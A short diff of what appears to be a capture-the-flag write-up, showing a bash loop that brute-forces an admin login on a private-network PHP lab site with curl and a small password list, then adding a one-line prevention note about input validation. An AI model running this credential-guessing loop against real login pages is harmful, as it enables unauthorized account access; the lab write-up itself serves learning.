@@ -35,7 +35,10 @@ HOW?
                  pass = (list of password and usernames emanana shadow root admin dragon)
                  for i in ${pass[@]}; do
 	                curl -X POST "http://192.168.42.238/index.php?page=signin&username=admin&password=${i}&Login=Login#" | grep 'flag'
-done
+                done
 
 
+
+PREVENTION__
+    => server-side and client side validation.
 ```
